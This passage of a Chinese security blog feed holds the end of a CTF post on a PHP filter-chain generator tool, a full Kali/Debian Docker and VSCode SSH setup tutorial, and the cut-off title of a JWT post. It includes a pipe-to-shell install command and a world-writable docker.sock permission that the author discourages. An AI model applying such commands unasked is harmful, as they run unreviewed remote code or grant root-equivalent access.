class="headerlink" title="Generator"></a>Generator</h4><p>Filter链的生成依靠Generator.py实现。</p><p>目前提供两种模式：</p><ul><li>使用.res文件夹中原有的hexcode编码字母的链子生成</li><li>使用dictionary.py中的字典生成</li></ul><p>如果你要使用第一种模式，项目下载时就附带好了对应hexcode的字典，只需要在文件开头设置参数即可：</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110437.png" alt="img"></p><p>当然您也可以根据项目原理自己生成。</p><p>如果您使用第二种模式，项目也准备了一份Fuzz好的单字母字典在dictionary.py中：</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110005.png" alt="img"></p><p>您也可以根据自己的需求Fuzz，流程大致如下：</p><ul><li>设定好需要的字符集</li><li>运行Fuzzer.php</li><li>使用get_dic.py程序从.res中提取跑好的字典</li></ul><p>当然您如果熟悉原理，也可以用您想要的方法，<a href="http://自行修改字典文件dictionary.py/">自行修改字典文件dictionary.py</a>。</p><p>当一切准备就绪，直接使用下面命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python Generator.py<br></code></pre></td></tr></table></figure><p>即可。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Build-Your-Remote-Linux-Docker</title>
    <link href="/2022/11/29/Build-Your-Remote-Linux-Docker/"/>
    <url>/2022/11/29/Build-Your-Remote-Linux-Docker/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Author ：探姬<br>原文于语雀发布，地址为：<a href="https://www.yuque.com/probius/cs_wp/fegz0w">https://www.yuque.com/probius/cs_wp/fegz0w</a></p></blockquote><p>本文也有配套视频，建议结合食用：(给个三连吧www)<br><a href="https://www.bilibili.com/video/BV1684y1z7L6">https://www.bilibili.com/video/BV1684y1z7L6</a></p><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p>本文档完整的流程可以帮助您在 <strong>Kali Linux</strong>上完成Docker环境，并且基于Vscode的Remote功能，利用SSH协议，构建 VSCODE + SSH + Docker 的工作流，提高效率。<br>同样，本文档也考虑了非Kali，用于开发&#x2F;生产环境的 <strong>Ubuntu &#x2F; Debian</strong> 系统 ，如果您想要在开发&#x2F;生产中使用该工作流，可以直接从 <strong>Get Docker</strong>或者 <strong>Build SSH＋vscode + docker Workflow</strong>章节开始。<br>笔者水平有限，错误疏漏之处在所难免，烦请各位师傅斧正。<br>以及非常感谢 **陈橘墨(@*<em>Randark_JMT*</em>)师傅**提供的帮助。</p><h2 id="Get-Kali"><a href="#Get-Kali" class="headerlink" title="Get Kali"></a>Get Kali</h2><h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p>在Kali官网下载即可，建议直接下载封装好的虚拟机版本：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108984.png" alt="image.png"><br>解压下载好的压缩包到您想要放置虚拟机的位置，然后双击配置文件直接打开自动添加，或者在VMware中手动添加：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108041.png" alt="image.png"><br>添加完成后，启动即可：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108250.png" alt="image.png"><br>（当然，作为DockerRuner，您可能需要设置一个稍微大点的内存值）<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108214.png" alt="image.png"></p><h3 id="ChangeResource？"><a href="#ChangeResource？" class="headerlink" title="ChangeResource？"></a>ChangeResource？</h3><p>笔者并不建议换源，Kali官方源的速度还是不错的，换源可能会导致您软件管理出现问题。</p><h2 id="Get-Docker"><a href="#Get-Docker" class="headerlink" title="Get Docker"></a>Get Docker</h2><h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><p>docker安装目前有两个版本，一个是官方的<strong>docker.ce</strong>版本，一个是有Debian团队维护的**<a href="http://docker.io/">docker.io</a>**版本。<br>之前有争议说 <a href="http://docker.io/">docker.io</a> 是旧版本的docker 而新版的docker是 dockers.ce<br>然而docker.io的版本有时会比docker.ce高，事实上，两者只是负责维护的组织不同，前者是Debian官方维护，后者则为Docker官方维护，并没后新旧之分：</p><h4 id="docker-io"><a href="#docker-io" class="headerlink" title="docker.io"></a><a href="http://docker.io/">docker.io</a></h4><p>该版本由Debian团队维护，采用 apt 的方式管理依赖<br>安装过程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get update<br></code></pre></td></tr></table></figure><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108106.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install docker.io<br></code></pre></td></tr></table></figure><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108155.png" alt="image.png"><br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108090.png" alt="image.png"></p><h4 id="docker-ce"><a href="#docker-ce" class="headerlink" title="docker.ce"></a>docker.ce</h4><p>由docker官方维护的版本，采用 go 的方式管理依赖，如果您要在开发&#x2F;生产环境中使用docker，推荐使用该版本。<br>如果您的Linux版本为Ubuntu&#x2F;Debian，可以使用一下命令自动安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -qO- https://get.docker.com/ | sh<br></code></pre></td></tr></table></figure><p>（注意，Docker并不支持Kali一键安装，同样笔者也不推荐您用kali作为开发生产环境，Kali满足日常需要，使用io版本即可，当然您也可以使用.ce版本的手动安装）<br>手动安装：<br>可以参考Docker官方的 Docker Engine安装步骤：<br>但是该步骤在 Kali Linux上面可能会存在一定问题，以Kali为例，完整的按照流程如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get update<br>sudo apt-get install \<br>    ca-certificates \<br>    curl \<br>    gnupg \<br>    lsb-release<br></code></pre></td></tr></table></figure><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108273.png" alt="image.png"><br>选项选择Yes就好。<br>然后按照官网提示，添加Docker官方的 GPG key：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">mkdir</span> -p /etc/apt/keyrings<br>curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg<br></code></pre></td></tr></table></figure><p>然后设置仓库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> \<br>  <span class="hljs-string">&quot;deb [arch=<span class="hljs-subst">$(dpkg --print-architecture)</span> signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian \</span><br><span class="hljs-string">  <span class="hljs-subst">$(lsb_release -cs)</span> stable&quot;</span> | sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null<br></code></pre></td></tr></table></figure><p>然后开始安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get update<br>sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin<br></code></pre></td></tr></table></figure><p>随后，如果您是Kali Linux，您可能会遭遇以下报错：</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108058.png" alt="image.png"><br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108673.png" alt="image.png"><br>这是由于Docker官方并没有提供直接支持Kali的源，所以我们使用Debian的源就好：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%s\n&quot;</span> <span class="hljs-string">&quot;deb [arch=amd64] https://download.docker.com/linux/debian buster stable&quot;</span> |\<br>sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/docker-ce.list<br></code></pre></td></tr></table></figure><p>并且添加对应的密钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -<br></code></pre></td></tr></table></figure><p>注意不要忘了给密钥相应权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chmod</span> a+r /etc/apt/keyrings/docker.gpg<br></code></pre></td></tr></table></figure><p>此时再跑一次 <code>sudo apt-get update</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get update<br></code></pre></td></tr></table></figure><p>您可能会遇到一个找不到的源，这个是正常的。<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108201.png" alt="image.png"><br>接下来安装docker：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin<br></code></pre></td></tr></table></figure><p>就能正常获取了：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108660.png" alt="image.png"><br>安装完成后，执行hello-world，得到图示则安装成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo docker run hello-world<br></code></pre></td></tr></table></figure><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108202.png" alt="image.png"></p><h3 id="DockerHub"><a href="#DockerHub" class="headerlink" title="DockerHub"></a>DockerHub</h3><p>尝试登录您的<strong>DockerHub</strong>账号：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108423.png" alt="image.png"><br>如果出现类似错误，请手动配置DNS：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo vim /etc/resolv.conf<br></code></pre></td></tr></table></figure><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108043.png" alt="image.png"><br>保存，再次尝试即可成功登录：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108243.png" alt="image.png"></p><h2 id="Build-SSH＋vscode-docker-Workflow"><a href="#Build-SSH＋vscode-docker-Workflow" class="headerlink" title="Build SSH＋vscode + docker Workflow"></a>Build SSH＋vscode + docker Workflow</h2><p>该步骤适用于支持SSH协议的Linux（废话，哪个Linux没有个SSH），除了在本地的Kali或者其他Linux上面构建，也支持远程构建该工作流。</p><h3 id="Start-SSH-Service"><a href="#Start-SSH-Service" class="headerlink" title="Start SSH Service"></a>Start SSH Service</h3><h4 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h4><p>Kali虚拟机默认是没有开启ssh服务的 （ssh状态：<code>/etc/init.d/ssh status</code>）<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108687.png" alt="image.png"><br>所以需要手动启动一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo /etc/init.d/ssh start <br></code></pre></td></tr></table></figure><p>当然，为了方便，我们将ssh添加到开机自启中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo update-rc.d ssh <span class="hljs-built_in">enable</span><br><span class="hljs-comment"># Or use:</span><br>systemctl <span class="hljs-built_in">enable</span> ssh.service<br></code></pre></td></tr></table></figure><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108870.png" alt="image.png"><br>启动之后就可以开始后面的步骤了。</p><h4 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h4><p>由于ubuntu默认不自带openssh-server，所以这里需要手动安装。<br>安装openssh-server：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install openssh-server<br></code></pre></td></tr></table></figure><p>安装完成后启动服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo service ssh start<br></code></pre></td></tr></table></figure><h3 id="Get-Remote-SSH"><a href="#Get-Remote-SSH" class="headerlink" title="Get Remote - SSH"></a>Get Remote - SSH</h3><p>为了使用vscode的远程ssh功能 您可能需要在扩展中安装<code>Remote - SSH</code>插件：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108363.png" alt="image.png"></p><h3 id="Let-Vscode-Connect-to-host"><a href="#Let-Vscode-Connect-to-host" class="headerlink" title="Let Vscode Connect to host"></a>Let Vscode Connect to host</h3><p>连接方式有两种：<code>密码连接</code> 和 <code>ssh的公私钥</code>。<br>一般情况下我们使用密码连接，这样的方法安全性较低，而且每次连接和每次切换目录的时候都会要求输入密码，所以在确保能够密码连接情况下，我们可以进一步使用公私钥验证的方式来提升安全性和优化操作友好性。</p><h4 id="Using-password-connection"><a href="#Using-password-connection" class="headerlink" title="Using password connection"></a>Using password connection</h4><p>打开vscode，点击左下角的远程连接（绿色的部分）<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108580.png" alt="image.png"><br>接着在弹出的窗口中选择 Connect to Host<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108159.png" alt="image.png"><br>选择 <code>Add New SSH Host</code>：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108672.png" alt="image.png"><br>按照要求输入对应的指令：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108860.png" alt="image.png"><br>IP可通过 <code>ip a</code> 获取<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108321.png" alt="image.png"><br><code>ssh kali@192.168.28.145 -A</code><br>保存位置默认第一个就好：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108500.png" alt="image.png"><br>然后连接：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108023.png" alt="image.png"><br>选择对应的系统：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108268.png" alt="image.png"><br>选择继续：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108889.png" alt="image.png"><br>输入密码：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108092.png" alt="image.png"><br>初始化完成后就连接上了：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108596.png" alt="image.png"></p><h4 id="Using-public-and-private-keys"><a href="#Using-public-and-private-keys" class="headerlink" title="Using public and private keys"></a>Using public and private keys</h4><h5 id="Create-public-and-private-keys"><a href="#Create-public-and-private-keys" class="headerlink" title="Create public and private keys"></a>Create public and private keys</h5><p>首先在本机上生成对应的公钥私钥：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen</span><br></code></pre></td></tr></table></figure><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108885.png" alt="image.png"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">Enter <span class="hljs-keyword">file</span> in which to save the key (C:\Users\Probius<span class="hljs-regexp">/.ssh/i</span>d_rsa):<br></code></pre></td></tr></table></figure><p>输入保存路径，如果为空默认为 <code>C:\Users\USERNAME/.ssh/id_rsa</code>，这里笔者直接输入了名字，让其以该名字直接保存在当前目录</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Enter</span> passphrase (empty for <span class="hljs-literal">no</span> passphrase):<br></code></pre></td></tr></table></figure><p>输入私钥密码，为空则没有</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Enter</span> <span class="hljs-variable">same</span> <span class="hljs-variable">passphrase</span> <span class="hljs-variable">again</span><span class="hljs-operator">:</span><br></code></pre></td></tr></table></figure><p>注意：如果您使用了私钥密码，那么在进行ssh登录的时候，会提示您输入私钥密码，相当于再使用公私钥登录的情况下又加了一层密码，安全性有很大的提升，但是这样会变得和密码登录一样每次都要输入，这里笔者建议，如果是本地一路回车就好了，如果是远程资源的管理，可以综合安全性考虑<br>生成过后，得到的<code>id_rsa.pub</code>(Kali_test.pub)是<strong>公钥</strong>，<code>id_rsa</code>(Kali_test)是**私钥 **<br>将得到的私钥放在我们的.ssh(C:\Users\USERNAME.ssh)中。<br>(您也可以在生成的时候就让他防止在此，当然这并不是重点）</p><h5 id="Configuring-Remote-Host"><a href="#Configuring-Remote-Host" class="headerlink" title="Configuring Remote Host"></a>Configuring Remote Host</h5><p>将得到的公钥上传到 Kali&#x2F;服务器中对应用户的.ssh文件夹中(请确保该文件夹至少有700的权限)：<br>（注意 kali默认没有该文件夹，需要用户手动创建，并且赋700权限 <code>mkdir ~/.ssh</code> ）<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108425.png" alt="image.png"><br>在此处打开终端，用公钥文件来生成 authorized_keys：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> id_ras.pub &gt;&gt; authorized_keys<br><span class="hljs-comment"># 此处既 cat Kali_test.pub &gt;&gt; authorized_keys</span><br></code></pre></td></tr></table></figure><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108635.png" alt="image.png"><br>由于Linux系统对.ssh拥有比较严格的权限限制，请确保权限配置正确：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chmod</span> 600 authorized_keys<br>sudo <span class="hljs-built_in">chmod</span> 700 ~/.ssh<br></code></pre></td></tr></table></figure><p>编辑ssh配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo vim /etc/ssh/sshd_config<br></code></pre></td></tr></table></figure><p>确保拥有以下条目：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">RSAAuthentication <span class="hljs-built_in">yes</span><br>PubkeyAuthentication <span class="hljs-built_in">yes</span><br></code></pre></td></tr></table></figure><p>注意Kali的ssh默认配置是没有上诉两项的，需要自行添加：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108226.png" alt="image.png"><br>然后搞定一切后 重启SSH服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo service ssh restart<br></code></pre></td></tr></table></figure><p>Linux部分的配置这样就搞定啦~<br>（在您确保您的连接无误后，如果是服务器等远程设备，可以在config中关闭密码登录以提升安全性：<br><code>PasswordAuthentication no</code>）</p><h5 id="Configuring-Local-Host"><a href="#Configuring-Local-Host" class="headerlink" title="Configuring Local Host"></a>Configuring Local Host</h5><p>然后是Windows，也就是vscode这边的配置：<br>添加NewHost：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108830.png" alt="image.png"><br>使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh USERNAME@IP -i C:\\Users\\Probius\\.ssh\\RAS_ID<br></code></pre></td></tr></table></figure><p>（注意使用指令添加时，务必使用双斜杠）<br>当然，也可以在已经添加的配置文件上改：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Host <span class="hljs-number">192.168</span>.<span class="hljs-number">28.145</span><br>HostName <span class="hljs-number">192.168</span>.<span class="hljs-number">28.145</span><br><span class="hljs-keyword">User</span> <span class="hljs-title">kali</span><br>IdentityFile C:\Users\Probius\.ssh\Kali_test<br></code></pre></td></tr></table></figure><p>如果操作无误，且没有设置私钥密码，那么点击连接之后无需其他额外操作即可连接；如果设置了私钥密码，那么按照提示输入即可。</p><h5 id="Other-About-SSH-key-login"><a href="#Other-About-SSH-key-login" class="headerlink" title="Other_About SSH key login"></a>Other_About SSH key login</h5><p>关于ssh密钥登录的更多知识可以看这一篇文章：</p><h3 id="Get-The-Docker-Extension"><a href="#Get-The-Docker-Extension" class="headerlink" title="Get The Docker Extension"></a>Get The Docker Extension</h3><h4 id="Install-extension"><a href="#Install-extension" class="headerlink" title="Install extension"></a>Install extension</h4><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108387.png" alt="image.png"><br>（当然 如果显示的是 <code>安装</code>也是一样的）<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108927.png" alt="image.png"></p><h4 id="Solve-error"><a href="#Solve-error" class="headerlink" title="Solve error"></a>Solve error</h4><p>如果您使用自动安装，应该不会遇到该问题，自动安装的sh会自动完成用户组添加的操作。<br>由于权限原因，我们可能无法访问到 <code>/var/run/docker.sock</code><br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108599.png" alt="image.png"></p><h5 id="By-add-user-group"><a href="#By-add-user-group" class="headerlink" title="By add user group"></a>By add user group</h5><p>一劳永逸的解决权限问题，将当前用户组添加到docker组即可。<br>创建docker用户组，默认安装时就会自动创建，所以执行可能会显示<code>exist</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo groupadd docker <br></code></pre></td></tr></table></figure><p>添加当前用户到该组：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo usermod -aG docker <span class="hljs-variable">$&#123;USER&#125;</span> <br></code></pre></td></tr></table></figure><p>然后重新启动容器服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl restart docker <br></code></pre></td></tr></table></figure><p>再次重新登入即可，如果重新登录之后依旧报错无法读取，请尝试重启：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">reboot<br></code></pre></td></tr></table></figure><h5 id="By-chmod"><a href="#By-chmod" class="headerlink" title="By chmod"></a>By chmod</h5><p>也可以使用<code>sudo chmod 777 /var/run/docker.sock</code>，但是每次重启之后权限都会重置，不推荐<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108210.png" alt="image.png"><br>然后就能正常访问了：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108359.png" alt="image.png"></p><h3 id="Start-Use"><a href="#Start-Use" class="headerlink" title="Start Use"></a>Start Use</h3><p>（以下操作使用<strong>DockerHub</strong>演示）<br>因为在安装Docker的时候登录过DockerHub所以这里连接之后，系统会自动获取您的凭证，您可以在这查看您的DockerHub仓库：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108556.png" alt="image.png"><br>当然，您也可以添加其他仓库，具体的用法可以参考官方文档：</p><h4 id="Pull-Image"><a href="#Pull-Image" class="headerlink" title="Pull Image"></a>Pull Image</h4><p>当然 对于自己仓库的镜像还是比较方便的233：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108132.png" alt="image.png"><br>当然如果是公开镜像的话 还是免不了指令啦，不过还是比较方便的，旁边就是终端：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108350.png" alt="image.png"><br>完成之后就能在IMAGES栏看到了：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108863.png" alt="image.png"></p><h4 id="Run-Docker"><a href="#Run-Docker" class="headerlink" title="Run Docker"></a>Run Docker</h4><p>运行容器有两个选项Run &#x2F; Run Ineractive</p><h5 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h5><p>默认后台运行，Run执行后效果和在Linux执行 -d的效果相同：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108098.png" alt="image.png"><br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108618.png" alt="image.png"></p><h5 id="Run-Interacitve"><a href="#Run-Interacitve" class="headerlink" title="Run Interacitve"></a>Run Interacitve</h5><p>该选项运行执行后，除了运行容器，还会跳到容器的汇总shell处，这里会实时打印容器日志，<br>效果和 <code>View Log</code>效果相同：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108893.png" alt="image.png"></p><h4 id="View-Log"><a href="#View-Log" class="headerlink" title="View Log"></a>View Log</h4><p>直达容器后台日志，如果在运行的时候选择<code>Run Interacitve</code>那么也会跳转到该log页面。<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108575.png" alt="image.png"><br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108780.png" alt="image.png"></p><h4 id="Attach-Shell"><a href="#Attach-Shell" class="headerlink" title="Attach Shell"></a>Attach Shell</h4><p>右键选中之后可以直接建立一个容器内部的shell，省去<code>docker exec -i -t ID /bin/bash</code><br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108362.png" alt="image.png"><br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108563.png" alt="image.png"></p><h4 id="Edit-Container"><a href="#Edit-Container" class="headerlink" title="Edit Container"></a>Edit Container</h4><p>在CONTAINERS中下拉一个容器的file可以对其进行查看和编辑：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108051.png" alt="image.png"><br>可以看到对于容器来说 修改是即时的（支持热更新的）<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108737.png" alt="image.png"></p><h4 id="Attach-Container（Advanced-Edit？）"><a href="#Attach-Container（Advanced-Edit？）" class="headerlink" title="Attach Container（Advanced Edit？）"></a>Attach Container（Advanced Edit？）</h4><p>我们也可以用Vscode建立类似SSH的连接，直接连接到整个容器：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108906.png" alt="image.png"><br>并且操作同步：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108429.png" alt="image.png"><br>而且容器支持文件拖拽，相比单纯的COPY指令 拥有更好的体验（个人感觉</p><h4 id="Port-Forward"><a href="#Port-Forward" class="headerlink" title="Port Forward"></a>Port Forward</h4><p>通过SSH直接将远程端口转发到本地，免除防火墙困扰ww<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108117.png" alt="image.png"><br>一般来讲在您启动容器的时候 vscode会自动配置 当然为了更好的区分和避免冲突 也可以手动分配<br>配置如图：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108383.png" alt="image.png"></p><h4 id="Open-in-Borrow"><a href="#Open-in-Borrow" class="headerlink" title="Open in Borrow"></a>Open in Borrow</h4><p>如果您配置完成了端口转发(或者vscode自动为您完成配置）那么点击Open in Borrow将在您的默认浏览器中快速打开该端口对应的页面：<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108971.png" alt="image.png"><br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108177.png" alt="image.png"></p><h4 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h4><p>其他用法，就请佬们自行探索啦ww</p><h2 id="ExtensionRecommend"><a href="#ExtensionRecommend" class="headerlink" title="ExtensionRecommend"></a>ExtensionRecommend</h2><h3 id="Thunder-Client"><a href="#Thunder-Client" class="headerlink" title="Thunder Client"></a>Thunder Client</h3><p>Thunder Client is a lightweight Rest API Client Extension for Visual Studio Code, hand-crafted by Ranga Vadhineni with simple and clean design.<br>要注意的是 该插件基于远程运行（既本体在虚拟机&#x2F;服务器上），在测试的时候请确保url指向正确。<br><img src="https://nssctf.wdf.ink//img/WDTJ/202302072108709.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>Develop</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>From Jwt To The XiangYunCup FunWeb</title>
    <link href="/2022/11/20/From-Jwt-To-The-XiangYunCup-FunWeb/"/>
    <url>/2022/11/20/From-Jwt-To-The-XiangYunCup-FunWeb/</url>
    
